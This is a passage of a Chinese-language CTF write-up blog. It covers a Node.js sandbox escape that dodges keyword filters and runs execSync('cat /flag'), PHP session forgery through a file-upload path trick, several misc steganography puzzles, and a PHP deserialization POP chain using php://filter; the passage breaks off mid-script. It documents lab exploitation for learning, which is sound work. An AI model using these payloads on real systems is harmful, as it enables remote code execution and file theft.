<p>process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤</p>
<p>绕过方式如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<p>最后修改为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>然后发现其他人的writeup直接在code后面加个[]就可以了。emmm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://90694257-8da6-479a-9ea9-cc97c08e88cd.node3.buuoj.cn/run.php?code[]=(function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a><strong>BabyUpload</strong></h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">&quot;/&quot;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如何得到flag呢，<code>session</code>必须得是<code>admin</code>其次必须存在success.txt。</p>
<p>首先这里两个POST参数，direction是用来选择上传或读取的，attr会被拼接到路径中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br></pre></td></tr></table></figure>

<p>再看upload的部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            throw new RuntimeException(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里会将路径拼接，也就是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/var/babyctf/$_POST[<span class="string">&#x27;attr&#x27;</span>]/文件名_sha256(临时文件名)</span><br></pre></td></tr></table></figure>

<p>从源码开头的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以得知修改attr为空，文件名为sess，便可以伪造session文件。</p>
<p>下一步就是利用download读取自己的session，发现session内容格式，得知session引起为php_binary。</p>
<img src="http://img.kawhi.xyz/image-20200424145858004.png" alt="image-20200424145858004" style="high:60%;width:60%;" />

<p>在源代码里面是这样的</p>
<img src="http://img.kawhi.xyz/image-20200424145951565.png" alt="image-20200424145951565" style="high:60%;width:60%;" />

<p>然后直接复制出来保存在sess的文件里面，并把guest改为admin。并上传到靶机上面：</p>
<img src="http://img.kawhi.xyz/image-20200424150334856.png" alt="image-20200424150334856" style="high:80%;width:80%;" />

<p>然后可以测试出来sess的文件的hash值：</p>
<img src="http://img.kawhi.xyz/image-20200424150522602.png" alt="image-20200424150522602" style="high:80%;width:80%;" />

<p>然后可以用download的方式查看一下是否上传成功了：</p>
<img src="http://img.kawhi.xyz/image-20200424150642155.png" alt="image-20200424150642155" style="high:80%;width:80%;" />

<img src="http://img.kawhi.xyz/image-20200424150705164.png" alt="image-20200424150705164" style="high:80%;width:80%;" />

<p>可以看到已经成功改为admin。</p>
<p>不过还需要有一个success.txt，由于他这里用的是file_exists，所以我们令attr=success.txt使之成为一个路径也能通过检测。然后这里的文件随便填就行。</p>
<img src="http://img.kawhi.xyz/image-20200424154207639.png" alt="image-20200424154207639" style="high:80%;width:80%;" />

<p>这样两个条件都满足了，抓包改PHPSESSID即可得到flag。</p>
<img src="http://img.kawhi.xyz/image-20200424154520097.png" alt="image-20200424154520097" style="high:80%;width:80%;" />

<h2 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a><strong>MRCTF</strong></h2><h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a><strong>你能看懂音符吗</strong></h3><p>用010打开后改一下发现文件头被改，把61 52改为52 61即可。</p>
<p>然后发现打开docx，显示隐藏文字，然后发现一段音符：</p>
<p>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</p>
<p>然后直接在这个网站解密即可得到flag：<a class="foo" target="_blank" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">传送门</a></p>
<h3 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a><strong>不眠之夜</strong></h3><p>打开之后发现有很多图片，直接使用命令合在一起</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">montage *.jpg -geometry +<span class="number">0</span>+<span class="number">0</span>+<span class="number">0</span> ok.jpg</span><br></pre></td></tr></table></figure>

<p>然后用gaps这个工具自动拼图：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gaps --image=ok.jpg --generations=<span class="number">50</span> --population=<span class="number">120</span> --size=<span class="number">50</span></span><br></pre></td></tr></table></figure>

<h3 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a><strong>寻找xxx</strong></h3><p>打开wav文件电话拨号声，直接扔dtmf读取出来，然后手动去重，因为有干扰声。工具：<a class="foo" target="_blank" href="https://github.com/hfeeki/dtmf">传送门</a></p>
<p>使用工具的时候在dtmf-decoder.py文件里面把：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># load wav file</span></span><br><span class="line">    wav = wave.open(<span class="string">&#x27;1.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>1.wav换成题目的wav即可。结果为：18684221609。</p>
<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_ misc"></a><strong>Hello_ misc</strong></h3><p>打开题目是一个压缩包和一张图片：</p>
<img src="http://img.kawhi.xyz/image-20200424211603839.png" alt="image-20200424211603839" style="high:60%;width:60%;" />

<p>binwalk这个try图片可以得到一个ZIP压缩包。</p>
<p>然后再用用<code>stegsolve</code>查看图片，<code>Save Bin</code>可直接得到图片：</p>
<img src="http://img.kawhi.xyz/image-20200424212518740.png" alt="image-20200424212518740" style="high:80%;width:80%;" />

<p>用图片上的密码打开ZIP压缩包。发现文档信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>观察可知文档中只含有 <strong>127 255 63 191</strong> 这四个数字，将这四个数字转化为二进制，可以看到这四个数字的二进制形式中 <strong>只有最高两位的二进制数不同</strong> ，将其最高两位提取出来组合在一起转化为ASCII，可以得到rar密码：</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;../out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.append(int(i))</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">	<span class="keyword">if</span> i ==<span class="number">63</span>:</span><br><span class="line">		a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">127</span>:</span><br><span class="line">		a= <span class="string">&#x27;01&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">191</span>:</span><br><span class="line">		a=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">255</span>:</span><br><span class="line">		a=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">	s +=a</span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">	result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>到rar包的解压密码：<strong>0ac1fe6b77be5dbe</strong></p>
<p>解压可以得到一个zip包，看zip包里的内容(里面都是xml)可以知道这是一个 <strong>docx</strong> 文件，改后缀为docx得到最终的文件。</p>
<p>将文件内容全选改为深色，可以看到在文档的最下方藏有几串字符</p>
<img src="http://img.kawhi.xyz/image-20200424212849538.png" alt="image-20200424212849538" style="high:80%;width:80%;" />

<p>再base64解密：</p>
<img src="http://img.kawhi.xyz/image-20200424212915052.png" alt="image-20200424212915052" style="high:80%;width:80%;" />

<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a><strong>ezpop</strong></h3><p>首先说一下</p>
<p>PHP类中的<code>__get</code>和<code>__set</code>函数。</p>
<p>当试图获取一个不可达属性时(比如private)，类会自动调用<code>__get</code>函数。</p>
<p>当试图设置一个不可达属性时(比如private)，类会自动调用<code>__set</code>函数。</p>
<p>举一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;周伯通&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>这里$sex声明了私用变量，私有变量或方法在类实例化是不能直接访问的，所以上面会抛出异常。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$sex </span><br></pre></td></tr></table></figure>

<p>然后改造一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;周伯通&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;个人信息:&#x27;</span>.$name.<span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>这里输出的是个人信息:sex男。</p>
<p>可以看出<code>__get</code>方法自动调用了，并可以访问私有变量。</p>
<p>再来看一下<code>__set</code>函数，同样也是先使用可达的私有属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;周伯通&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name, $val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;个人信息:&#x27;</span>.$name. $val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line">$class-&gt;sex = <span class="string">&#x27;女&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">个人信息:sex女</span><br></pre></td></tr></table></figure>

<p>可以看到因为设置了不可达属性$sex，所以成功调用了<code>__set</code>函数并输出。</p>
<p><code>__invoke()</code> 函数会在一个类被当成函数调用时被触发。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$param1, $param2</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump($param1,$param2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> CallableClass();</span><br><span class="line">$obj(<span class="number">123</span>, <span class="number">456</span>);</span><br><span class="line">var_dump(is_callable($obj));</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int(<span class="number">123</span>)</span><br><span class="line">int(<span class="number">456</span>)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<p>再来看看这道题目</p>
<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a><strong>题目源码</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag <span class="keyword">is</span> <span class="keyword">in</span> flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html<span class="comment">#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line"><span class="meta">    @unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>反序列化直接分析，构造pop链，分析一下三个类。</p>
<h4 id="Modifier类"><a href="#Modifier类" class="headerlink" title="Modifier类"></a><strong>Modifier类</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>include</code>函数，文件包含漏洞，我们可以使用伪协议读取注释中flag.php中的内容。</p>
<p>这里有魔法方法<code>__invoke</code>当脚本尝试将对象调用为函数时触发，所以在脚本中，要把Modifier类调用为函数。</p>
<h4 id="Show类"><a href="#Show类" class="headerlink" title="Show类"></a><strong>Show类</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>方法，接收参数<code>$file</code>，<code>$this-&gt;source = $file</code>将<code>$file</code>的值赋给<code>source</code>。而<code>$file</code>的值直接就是<code>index.php</code>，所以还是输出<code>index.php</code>。</li>
<li><code>__toString</code>方法，当前对象访问<code>str</code>再访问<code>source</code>，然后返回这个值，就是把类当作字符串使用时触发。</li>
<li><code>__wakeup</code>方法，使用反序列化的时候触发，过滤一些协议，但是显而易见可以用<code>filter</code>。</li>
</ul>
<h4 id="Test类"><a href="#Test类" class="headerlink" title="Test类"></a><strong>Test类</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>方法，把p对象变成一个数组。</li>
<li><code>__get</code>方法，从不可访问的属性中读取数据会触发。</li>
</ul>
<p>然后开始构造pop链：</p>
<p>因为最终是想调用文件包含函数，读取flag.php。所以要触发<code>__invoke</code>。</p>
<p>而<code>__get</code>将对象p作为函数调用，将p实例化为<code>Modifier</code>类，从而触发<code>__invoke</code>。</p>
<p>然后<code>__toString</code>访问<code>str</code>的<code>source</code>属性，如果将str实例化为Test，因为Test类中不含source属性，从而触发<code>__get</code>方法。</p>
<p><code>__wakeup</code>把对象当成字符串处理(做匹配的时候)，触发<code>__toString</code>。</p>
<p>最后是反序列化触发<code>__wakeup</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new 